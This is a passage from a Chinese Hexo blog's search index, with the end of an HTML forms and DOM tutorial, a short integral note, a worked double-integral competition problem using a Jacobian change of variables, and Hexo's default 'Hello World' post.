class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> <span class="attr">checked</span> /&gt;</span>男</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span>女</span><br><span class="line"><span class="comment">&lt;!--单选按钮的value必须手动指定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">兴趣爱好</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;basketball&quot;</span> /&gt;</span>打篮球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;football&quot;</span> <span class="attr">checked</span>  /&gt;</span>打足球</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;interest&quot;</span> <span class="attr">value</span>=<span class="string">&quot;volleyball&quot;</span> /&gt;</span>打排球</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">学历</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;grade&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;gz&quot;</span>&gt;</span>高中<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;dz&quot;</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;bk&quot;</span> <span class="attr">selected</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="comment">&lt;!--默认选中--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ss&quot;</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">简介<span class="comment">&lt;!--文本域,没有value属性，填的就是value--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">name</span>=<span class="string">&quot;introduce&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--username=jackon&amp;userpwd=111&amp;gender=1&amp;interest=football&amp;grade=bk&amp;introduce=111--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接也可以提交数据给服务器，但提交的数据时固定的。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--超链接时gets请求，不是post请求--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://localhost:8080/jd/register?username=ctl&amp;password=111&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--http://localhost:8080/jd/register?username=ctl&amp;password=111</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/MKi9Y1QOwZTHuaJ.png" alt="用户注册表单.png"></p><h2 id="一些控件"><a href="#一些控件" class="headerlink" title="一些控件"></a>一些控件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>一些控件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--下拉列表支持多选--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--multiple支持多选，但要按住CTRL--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--size控制显示的条数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>福建省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>江西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>山东省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>海南省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>陕西省<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文件上传专用--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--隐藏域hidden 控件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网页上看不到，但表单提交的时候数据会自动提交给服务器。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--userid=111&amp;usercode=--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span>  /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--readonly和disabled--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--相同点:都是只读不能修改</span></span><br><span class="line"><span class="comment">不同点:readonly可以提交给服务器,disabled数据包不会提交(即使由name属性)</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8080/jd/save&quot;</span>&gt;</span></span><br><span class="line">用户代码<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usercode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111&quot;</span><span class="attr">readonly</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">用户姓名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> <span class="attr">disabled</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交数据&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--usercode=111--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--input控件的maxlength的属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--设置文本框中可输入字符的数量--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--提一提--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--HTML中元素的id属性--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、在HTML文档中，任何元素（节点）都有id属性</span></span><br><span class="line"><span class="comment">2、id属性时该节点的唯一标识，所以在同一个HTML文档中id值不能重复</span></span><br><span class="line"><span class="comment">3、id有什么用?</span></span><br><span class="line"><span class="comment">a.id是为了让我们更方便的获取这个元素</span></span><br><span class="line"><span class="comment">b.JavaScript可以对HTML文档中任意节点进行增删改操作，那么增删改之前需要先拿到这个节点，通常我们通过id来拿节点对象</span></span><br><span class="line"><span class="comment">4、THML文档是一棵树，树上有很多节点，每一个节点有唯一的id</span></span><br><span class="line"><span class="comment">  (DOM树)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://smms.app/image/KYOs57H8RPvpTUaS&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://s2.loli.net/2023/03/05/KYO57H8RPvpTUaS.png&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span> <span class="attr">size</span>=<span class="string">&quot;50&quot;</span>&gt;</span>DOM树<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;userpwd&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userpwd&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--id就是节点的身份证号，不能重复.--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表单提交数据的时候只和name有关和id无关--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/j4AhuTDvOSVIlbQ.png" alt="122.png"></p><h2 id="div和span"><a href="#div和span" class="headerlink" title="div和span"></a>div和span</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中的div和span<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">1、div和span有什么用？？</span></span><br><span class="line"><span class="comment">div和span都可以称为“图层”</span></span><br><span class="line"><span class="comment">div和span时可以定位的，只要顶下dic的左上角的x轴和y轴坐标即可</span></span><br><span class="line"><span class="comment">2、图层有什么用？</span></span><br><span class="line"><span class="comment">保证页面可以灵活的布局</span></span><br><span class="line"><span class="comment">3、最早的网页使用table布局，但是table不灵活，太死板</span></span><br><span class="line"><span class="comment">现代网页开发div布局使用最多，几乎很少使用table进行布局</span></span><br><span class="line"><span class="comment">4、div和span的区别？</span></span><br><span class="line"><span class="comment">默认情况下div会占用一行，span不会占用一行</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div2&quot;</span>&gt;</span>我是一个div<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span1&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;span2&quot;</span>&gt;</span>我是一个span标签<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/GDiRjskFudHpvTM.png" alt="11.png"></p><h1 id="暂停于此"><a href="#暂停于此" class="headerlink" title="暂停于此"></a>暂停于此</h1>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一道积分笔记</title>
      <link href="/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/16/%E4%B8%80%E9%81%93%E7%A7%AF%E5%88%86%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/10/16/oQcA3TLsHYMVnkb.png" alt="MommyTalk1665933979433.png"><br><strong>忘记加绝对值</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇思妙想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2022/10/15/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="以一道数学题开始我的发文"><a href="#以一道数学题开始我的发文" class="headerlink" title="以一道数学题开始我的发文"></a>以一道数学题开始我的发文</h1><p><font size=4>废话不多说，直接上题</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_D&space;\frac{(x&plus;y)&space;\ln&space;\left(1&plus;\frac{y}{x}\right)}{\sqrt{1-x-y}}&space;\mathrm{d}&space;x&space;\mathrm{d}&space;y" title="https://latex.codecogs.com/svg.image?\iint_D \frac{(x+y) \ln \left(1+\frac{y}{x}\right)}{\sqrt{1-x-y}} \mathrm{d} x \mathrm{d} y" /> </div>&emsp; 其中区域D由直线x + y = 1 与两坐标轴所围成得三角形区域。<p><strong>解:</strong><br>　　这题的式子较为复杂，直接求解可能计算量偏大，进而考虑其它方法，首先考虑换元法.<br>　　不妨设：</p><div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x&plus;y=u&space;\\\frac{y}{x}=u\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x+y=u \\\frac{y}{x}=u\end{array}\right." /> </div>　　解，得：<div align=center><img src="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1&plus;u}&space;\\y=\frac{u&space;v}{1&plus;v}\end{array}\right." title="https://latex.codecogs.com/svg.image?\left\{\begin{array}{l}x=\frac{u}{1+u} \\y=\frac{u v}{1+v}\end{array}\right." /> </div>　　因为由x, y 两个变量的变换所以我们需要用到<strong>隐函数存在定理3</strong>的Jacobi行列式，下面<p><img src="https://s2.loli.net/2022/10/15/yJCXGEU2qwHfaVD.png" alt="例子.png"> </p><p>【注】设 <img src="https://latex.codecogs.com/svg.image?x=x(u,&space;v),&space;\quad&space;y=y(u,&space;v)" title="https://latex.codecogs.com/svg.image?x=x(u, v), \quad y=y(u, v)" /> ，<strong>雅可比行列式</strong>是:</p><div align=center><img src="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=\left|\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}\right|" title="https://latex.codecogs.com/svg.image?\mathbf{J}=\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=\left|\begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}\right|" /> </div><em>这只是公式，其条件需要读者自寻理解。(ps：我也是小菜鸟)</em><p><img src="https://s2.loli.net/2022/10/15/61EHL8sva3ZlQNu.jpg" alt="1665809444664.jpg"><br><em><center>（给上书本的定义，我也理解理解）</center></em><br>　　这里有个值得注意的是在积分是dxdy代表的是<strong>面积</strong>，所以在变换时需要对<strong>J</strong>加上绝对值,所以原式可以化为下面这样</p><div align=center><img src="https://latex.codecogs.com/svg.image?\iint_{D1}&space;\frac{u&space;\ln&space;(1&plus;v)}{\sqrt{1-u}}\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|&space;d&space;u&space;d&space;v." title="https://latex.codecogs.com/svg.image?\iint_{D1} \frac{u \ln (1+v)}{\sqrt{1-u}}\left|\frac{\partial(x, y)}{\partial(u, v)}\right| d u d v." /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x,&space;y)}{\partial(u,&space;v)}\right|=||&space;\begin{array}{ll}x_u&space;&&space;x_v&space;\\y_u&space;&&space;y_v\end{array}||=|&space;\frac{u}{(1&plus;v)^2}&space;\mid" title="https://latex.codecogs.com/svg.image?\left|\frac{\partial(x, y)}{\partial(u, v)}\right|=|| \begin{array}{ll}x_u & x_v \\y_u & y_v\end{array}||=| \frac{u}{(1+v)^2} \mid" /></div><p>下面来找一找积分区域：<br>　　原来的积分区域:</p><div align=center><img src="https://s2.loli.net/2022/10/15/7r1SyMhCcntuiDP.png" width=""></div>　　则 <img src="https://latex.codecogs.com/svg.image?\color{red}{u&space;=&space;x&space;&plus;&space;y}" title="https://latex.codecogs.com/svg.image?\color{red}{u = x + y}" /> 可以看作u在该可行域内的线性规划，易求得u的范围为（0,1） 而 <img src="https://latex.codecogs.com/svg.image?\color{red}{v&space;=&space;y&space;/&space;x}" title="https://latex.codecogs.com/svg.image?\color{red}{v = y / x}" /> 则可以看作过远点的直线在该区域内可行的斜率，易得角度为(0,pi/2),所以y的范围为(0，+∞)。<div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;\mu&space;\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;u&space;.&space;\\&\int_0^1&space;\frac{\mu^2}{\sqrt{1-\mu}}&space;d&space;u&space;\stackrel{\sqrt{1-\mu}=t}{=}&space;\int_1^0&space;\frac{\left(1-t^2\right)^2}{t}&space;\cdot(-2&space;t)&space;d&space;t&space;\\&=-2\left(\left.t\right|_1&space;^0-\left.\frac{2}{3}&space;t^3\right|_1&space;^0&plus;\frac{1}{5}\left.t^5\right|_1&space;^0\right)&space;\\&=\frac{16}{15}\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d \mu \int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d u . \\&\int_0^1 \frac{\mu^2}{\sqrt{1-\mu}} d u \stackrel{\sqrt{1-\mu}=t}{=} \int_1^0 \frac{\left(1-t^2\right)^2}{t} \cdot(-2 t) d t \\&=-2\left(\left.t\right|_1 ^0-\left.\frac{2}{3} t^3\right|_1 ^0+\frac{1}{5}\left.t^5\right|_1 ^0\right) \\&=\frac{16}{15}\end{aligned}" /></div><div align=center><img src="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{&plus;\infty}&space;\frac{\ln&space;(1&plus;v)}{(1&plus;v)^2}&space;d&space;v&space;&=\int_0^{&plus;\infty}&space;\ln&space;(1&plus;v)&space;d\left(-\frac{1}{1&plus;v}\right)&space;\\&=\left.-\frac{\ln&space;(1&plus;v)}{1&plus;v}\right|_0&space;^{&plus;\infty}&plus;\int_0^{&plus;\infty}&space;\frac{1}{\left(1&plus;v^2\right)^2}&space;d&space;v&space;\\&=0-\left.\frac{1}{1&plus;v}\right|_0&space;^{&plus;\infty}&space;\\&=1\end{aligned}" title="https://latex.codecogs.com/svg.image?\begin{aligned}\int_0^{+\infty} \frac{\ln (1+v)}{(1+v)^2} d v &=\int_0^{+\infty} \ln (1+v) d\left(-\frac{1}{1+v}\right) \\&=\left.-\frac{\ln (1+v)}{1+v}\right|_0 ^{+\infty}+\int_0^{+\infty} \frac{1}{\left(1+v^2\right)^2} d v \\&=0-\left.\frac{1}{1+v}\right|_0 ^{+\infty} \\&=1\end{aligned}" /></div><p>所以答案为<strong>16&#x2F;15</strong><br>　　下面附上一张参考答案的图：</p><div align=center><img src="https://s2.loli.net/2022/10/15/r6dFzqPkytagxR7.png" width=""></div><p><strong>感谢观看</strong></font></p><p><em>参考文章:</em><br><a href="markdown.com.cn/basic-syntax/">数学背景知识补充——雅可比矩阵 by Tiger</a><br><a href="https://www.bilibili.com/video/BV1oY4y1F7NB/?spm_id_from=333.999.0.0&vd_source=3ae03810e5d4ba6e6b93c5edd6c76912">全国大学生数学竞赛历年真题逐题精讲</a><br><a href="https://zhuanlan.zhihu.com/p/421295397">第一届全国大学生数学竞赛预赛试题及解析（非数学类）</a></p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/10/13/hello-world/"/>
      <url>/2022/10/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
